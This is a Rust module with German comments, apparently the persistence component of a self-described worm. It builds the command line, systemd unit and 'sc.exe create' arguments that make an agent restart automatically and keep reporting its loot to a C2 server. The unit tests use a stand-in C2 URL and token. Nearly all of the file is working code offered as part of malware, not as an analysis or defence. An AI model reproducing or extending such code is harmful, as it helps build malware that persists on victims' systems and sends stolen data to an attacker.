//! Die Form, in der der Agent nach einer Installation neu gestartet wird.
//!
//! Ein persistierter Agent muss mit derselben Invocation starten, mit der er
//! das erste Mal lief. Fehlt etwas, ist das Ergebnis ein Wurm, der entweder gar
//! nicht startet (fehlende Pflichtargumente) oder seine Beute im Klartext an
//! den C2 meldet (fehlender Server-Schlüssel).
//!
//! Deshalb existiert die Form genau einmal: der Agent baut sie aus seinen
//! Argumenten, und die beiden Plattform-Adapter rendern dieselbe Form. Unix
//! bekommt eine systemd-Unit mit `EnvironmentFile=`, Windows die `binPath=`-Zeile
//! von `sc.exe`. Kein Adapter kennt die Flag-Liste des Agenten.
//!
//! **Warum zwei Adapter und kein Trait:** Unix und Windows sind die einzigen
//! beiden Persistenzformen, die es gibt. Ein Trait würde die konkreten Renderer
//! verstecken, ohne etwas variabel zu machen.

use std::path::PathBuf;

/// Die Invocation, mit der der Agent neu gestartet wird.
///
/// Trägt Name, Binary, Argumente und Umgebung. Die Argumente enthalten
/// `${NAME}`-Platzhalter für die Werte, die nicht im Klartext in einer
/// für jeden lesbaren Unit-Datei stehen dürfen.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Invocation {
    /// Der Name des Dienstes (z.B. `kx-agent`). Bestimmt Dateinamen und
    /// `systemctl`-Namen.
    pub name: String,
    /// Der Pfad zur ausführbaren Datei.
    pub binary_path: PathBuf,
    /// Die Argumente, ohne das Binary selbst.
    ///
    /// Ein `${NAME}`-Platzhalter wird unter Unix von systemd aus der
    /// Environment-Datei aufgelöst; [`Invocation::resolved_args`] löst ihn
    /// selbst auf, wo es keine Environment-Datei gibt.
    pub args: Vec<String>,
    /// Die Umgebungsvariablen (KEY=VALUE). Unter Unix landen sie in einer
    /// Datei mit restriktiven Rechten.
    pub env: Vec<(String, String)>,
}

impl Invocation {
    /// Die Argumente, in denen die `${NAME}`-Platzhalter aufgelöst sind.
    ///
    /// Das ist die Form für Windows: `sc.exe` kennt keine Environment-Datei,
    /// dort muss der Wert selbst in der Befehlszeile stehen.
    pub fn resolved_args(&self) -> Vec<String> {
        self.args.iter().map(|a| self.resolve(a)).collect()
    }

    /// Die Befehlszeile als ein String — die Form, die `sc.exe` braucht.
    ///
    /// Das Binary steht in Anführungszeichen, weil ein Pfad Leerzeichen
    /// enthalten kann. Argumente werden nur dann quotiert, wenn sie es müssen.
    pub fn command_line(&self) -> String {
        let mut teile = vec![quote(&self.binary_path.to_string_lossy())];
        teile.extend(self.resolved_args().iter().map(|a| quote(a)));
        teile.join(" ")
    }

    /// Löst einen `${NAME}`-Platzhalter gegen die Umgebung auf.
    ///
    /// Nur ein ganzer Platzhalter wird ersetzt. Ein Platzhalter mitten im Text
    /// wäre in einer Befehlszeile mehrdeutig — dort bleibt der Text stehen.
    fn resolve(&self, arg: &str) -> String {
        let inner = match arg.strip_prefix("${").and_then(|r| r.strip_suffix('}')) {
            Some(inner) => inner,
            None => return arg.to_string(),
        };
        self.env
            .iter()
            .find(|(k, _)| k == inner)
            .map(|(_, v)| v.clone())
            .unwrap_or_else(|| arg.to_string())
    }
}

/// Quotet ein Argument für eine Befehlszeile.
///
/// Leerzeichen und Anführungszeichen während der Übergabe brauchen Anführungszeichen,
/// sonst zerlegt der Parser das Argument an der falschen Stelle.
fn quote(arg: &str) -> String {
    if arg.contains(' ') || arg.contains('"') {
        format!("\"{}\"", arg.replace('"', "\\\""))
    } else {
        arg.to_string()
    }
}

/// Die Argumente, mit denen `sc.exe` den Dienst registriert.
///
/// Sie stehen hier und nicht im Windows-Adapter: die Registrierung ist der
/// einzige Ort, an dem ein Argument verloren gehen kann, und nur hier lässt
/// sie sich ohne Windows prüfen.
///
/// Es sind Argumente und keine Zeile. Eine Zeile braucht eine Shell, und
/// `cmd.exe /C` liest die Anführungszeichen um den DisplayName als
/// Argumenttrenner — sc.exe antwortet dann mit seinem Usage-Text statt mit
/// einem Diensteintrag.
pub fn windows_service_arguments(invocation: &Invocation, display_name: &str) -> Vec<String> {
    vec![
        "create".to_string(),
        invocation.name.clone(),
        format!("binPath= {}", invocation.command_line()),
        "start=".to_string(),
        "auto".to_string(),
        format!("DisplayName= {display_name}"),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn beispiel() -> Invocation {
        Invocation {
            name: "kx-agent".to_string(),
            binary_path: PathBuf::from("/usr/local/bin/kx-agent"),
            args: vec![
                "--server".to_string(),
                "${KX_C2_URL}".to_string(),
                "--token".to_string(),
                "${KX_C2_TOKEN}".to_string(),
                "--start".to_string(),
                "10.0.0.1".to_string(),
            ],
            env: vec![
                (
                    "KX_C2_URL".to_string(),
                    "https://c2.test.local:8443".to_string(),
                ),
                ("KX_C2_TOKEN".to_string(), "geheim".to_string()),
            ],
        }
    }

    #[test]
    fn platzhalter_werden_gegen_die_umgebung_aufgeloest() {
        let args = beispiel().resolved_args();
        assert_eq!(args[1], "https://c2.test.local:8443");
        assert_eq!(args[3], "geheim");
        assert_eq!(args[5], "10.0.0.1");
    }

    #[test]
    fn ein_unbekannter_platzhalter_bleibt_stehen() {
        let inv = Invocation {
            args: vec!["${KX_FEHLT}".to_string()],
            ..beispiel()
        };
        assert_eq!(inv.resolved_args(), vec!["${KX_FEHLT}".to_string()]);
    }

    #[test]
    fn ein_platzhalter_mitten_im_text_bleibt_stehen() {
        let inv = Invocation {
            args: vec!["prefix-${KX_C2_TOKEN}".to_string()],
            ..beispiel()
        };
        assert_eq!(
            inv.resolved_args(),
            vec!["prefix-${KX_C2_TOKEN}".to_string()]
        );
    }

    #[test]
    fn die_befehlszeile_quotet_einen_pfad_mit_leerzeichen() {
        let inv = Invocation {
            binary_path: PathBuf::from("C:\\Program Files\\kx\\kx-agent.exe"),
            ..beispiel()
        };
        let cmd = inv.command_line();
        assert!(
            cmd.starts_with("\"C:\\Program Files\\kx\\kx-agent.exe\""),
            "{cmd}"
        );
    }

    #[test]
    fn die_befehlszeile_quotet_nur_und_kein_fuer_ein_geheimnis() {
        let cmd = beispiel().command_line();
        assert!(cmd.contains("--token geheim"), "{cmd}");
        assert!(
            !cmd.contains("--server \"https://c2.test.local:8443\""),
            "{cmd}"
        );
    }

    #[test]
    fn die_befehlszeile_enthält_die_flag_liste_in_reihenfolge() {
        let cmd = beispiel().command_line();
        let reihenfolge = ["--server", "--token", "--start"];
        let mut position = 0;
        for flag in reihenfolge {
            let treffer = cmd[position..]
                .find(flag)
                .unwrap_or_else(|| panic!("{flag} fehlt in {cmd}"));
            position += treffer + flag.len();
        }
    }

    #[test]
    fn die_sc_exe_argumente_traegen_die_vollstaendige_invocation() {
        let args = windows_service_arguments(&beispiel(), "Kx Agent");
        let zusammen = args.join(" ");
        assert!(
            zusammen.contains("binPath= /usr/local/bin/kx-agent"),
            "{zusammen}"
        );
        assert!(
            zusammen.contains("--server https://c2.test.local:8443"),
            "{zusammen}"
        );
        assert!(zusammen.contains("--token geheim"), "{zusammen}");
        assert!(zusammen.contains("--start 10.0.0.1"), "{zusammen}");
        assert!(zusammen.contains("start= auto"), "{zusammen}");
    }

    #[test]
    fn die_sc_exe_argumente_nennen_den_dienstnamen_aus_der_invocation() {
        let inv = Invocation {
            name: "kx-agent-test".to_string(),
            ..beispiel()
        };
        let args = windows_service_arguments(&inv, "Kx Agent");
        assert_eq!(args[0], "create");
        assert_eq!(args[1], "kx-agent-test");
    }

    #[test]
    fn der_displayname_bleibt_ein_eigenes_argument() {
        // Mit Leerzeichen muss er als eigenes Argument uebergeben werden —
        // eine Zeile wuerde ihn zerlegen.
        let args = windows_service_arguments(&beispiel(), "Kx Agent");
        assert!(
            args.iter().any(|a| a == "DisplayName= Kx Agent"),
            "{args:?}"
        );
    }
}
